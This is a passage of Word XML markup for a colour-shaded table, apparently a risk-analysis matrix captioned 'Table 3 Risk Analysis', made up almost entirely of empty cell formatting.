            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFF00"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="304"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="320" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1040" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2220" w:type="dxa"/>
            <w:gridSpan w:val="7"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="20"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:color w:val="4F81BD"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Table 3 Risk Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="36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30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="303"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1360" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="760" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="36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30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="00B050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>L</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1360" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="00B050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
